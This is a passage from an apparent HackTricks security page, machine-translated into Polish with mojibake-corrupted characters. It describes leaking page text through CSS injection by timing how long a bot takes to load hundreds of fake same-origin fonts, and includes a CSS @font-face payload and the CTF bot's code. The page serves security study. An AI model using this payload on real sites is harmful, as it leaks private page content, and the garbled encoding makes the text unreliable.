JednakÅ¼e, jeÅ›li rÃ³Å¼nica czasowa miÄ™dzy zbuforowanÄ… odpowiedziÄ… a niezbuforowanÄ… nie jest wystarczajÄ…co duÅ¼a, nie bÄ™dzie to przydatne. Na przykÅ‚ad autor wspomniaÅ‚: Jednak po testach odkryÅ‚em, Å¼e pierwszym problemem jest to, Å¼e prÄ™dkoÅ›Ä‡ nie rÃ³Å¼ni siÄ™ zbytnio, a drugim problemem jest to, Å¼e bot uÅ¼ywa flagi `disk-cache-size=1`, co jest naprawdÄ™ przemyÅ›lane.

### Ekstrakcja wÄ™zÅ‚a tekstowego (III): wyciek zestawu znakÃ³w przez czas Å‚adowania setek lokalnych "czcionek" (nie wymagajÄ…cych zewnÄ™trznych zasobÃ³w) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referencja:** To jest wspomniane jako [nieudane rozwiÄ…zanie w tym opisie](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

W tym przypadku moÅ¼esz wskazaÄ‡ **CSS do zaÅ‚adowania setek faÅ‚szywych czcionek** z tego samego ÅºrÃ³dÅ‚a, gdy wystÄ…pi dopasowanie. W ten sposÃ³b moÅ¼esz **zmierzyÄ‡ czas**, jaki zajmuje, i dowiedzieÄ‡ siÄ™, czy znak siÄ™ pojawia, czy nie, za pomocÄ… czegoÅ› takiego jak:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
A kod bota wyglÄ…da tak:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
WiÄ™c, jeÅ›li czcionka siÄ™ nie zgadza, czas odpowiedzi podczas odwiedzania bota powinien wynosiÄ‡ okoÅ‚o 30 sekund. Jednak jeÅ›li czcionka siÄ™ zgadza, zostanie wysÅ‚anych wiele Å¼Ä…daÅ„ w celu pobrania czcionki, co spowoduje ciÄ…gÅ‚Ä… aktywnoÅ›Ä‡ w sieci. W rezultacie zajmie to wiÄ™cej czasu, aby speÅ‚niÄ‡ warunek zatrzymania i otrzymaÄ‡ odpowiedÅº. Dlatego czas odpowiedzi moÅ¼na wykorzystaÄ‡ jako wskaÅºnik do okreÅ›lenia, czy czcionka siÄ™ zgadza.

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
